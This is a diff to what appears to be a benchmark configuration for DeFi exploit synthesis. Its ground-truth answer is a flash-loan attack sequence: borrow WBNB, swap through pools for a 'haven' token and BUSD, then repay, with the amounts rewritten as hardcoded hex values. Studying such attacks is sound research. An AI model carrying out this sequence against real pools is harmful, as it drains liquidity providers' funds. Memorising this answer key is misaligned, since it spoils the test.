@@ -33,12 +33,12 @@ extra_statements: []
 attack_goal_str: "wbnb;1e6"
 
 groundtruth:
-  - ["borrow", "wbnb", "owner", "1e18"]
+  - ["borrow", "wbnb", "owner", "0x6f05b59d3b20000"]
   - ["swap", "pairhw", "haven", "haven", "wbnb", "1", "1"]
-  - ["swap", "pairhw", "attacker", "wbnb", "haven", "1e18", "pairhw.getAmountOut(1e18, address(wbnb))"]
-  - ["swap", "pairbh", "attacker", "haven", "busd", "haven.balanceOf(address(attacker))", "pairbh.getAmountOut(haven.balanceOf(address(attacker)), address(haven)) * 85 / 100"]
-  - ["swap", "pairbw", "attacker", "busd", "wbnb", "busd.balanceOf(address(attacker))", "pairbw.getAmountOut(busd.balanceOf(address(attacker)), address(busd))"]
-  - ["payback", "wbnb", "owner", "1e18 * 1003 / 1000"]
+  - ["swap", "pairhw", "attacker", "wbnb", "haven", "0xde0b6b3a764000", "0x10d9e630e3b"]
+  - ["swap", "pairbh", "attacker", "haven", "busd", "0xea7bb7545d", "0xe54f93491895b800"]
+  - ["swap", "pairbw", "attacker", "busd", "wbnb", "0xe54f93491895b800", "0xe4fbc69449f200"]
+  - ["payback", "wbnb", "owner", "0x6f05b59d3b20000 * 1003 / 1000"]
 
 # Information for search space building.
 roles:
